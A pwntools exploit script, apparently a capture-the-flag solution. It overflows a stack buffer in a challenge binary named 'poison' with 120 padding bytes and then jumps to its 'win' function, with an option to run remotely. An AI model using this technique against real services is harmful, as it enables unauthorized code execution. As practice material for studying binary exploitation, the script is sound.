#!/usr/bin/python
from pwn import *
import sys

config = {
	"elf" : "./poison",
	"libc" : "",
	"HOST" : "asd",
	"PORT" : 123
}

def exploit(r):
	r.sendlineafter("Choice> ", "0")
	rop = "A"*120
	rop+= p64(e.symbols["win"])
	r.sendlineafter("Say> \"", rop)
	r.interactive()
	return

if __name__ == "__main__":
	if "elf" in config.keys() and config["elf"]:
		e = ELF(config["elf"])
	if "libc" in config.keys() and config["libc"]:
		libc = ELF(config["libc"])

	if "remote" in sys.argv:
		r = remote(config["HOST"], config["PORT"])
	else:
		if "libc" in dir():
			r = process(config["elf"], env={"LD_PRELOAD" : config["libc"]})
		else:
			r = process(config["elf"])

		print util.proc.pidof(r)
		if "debug" in sys.argv:
			pause()

	exploit(r)
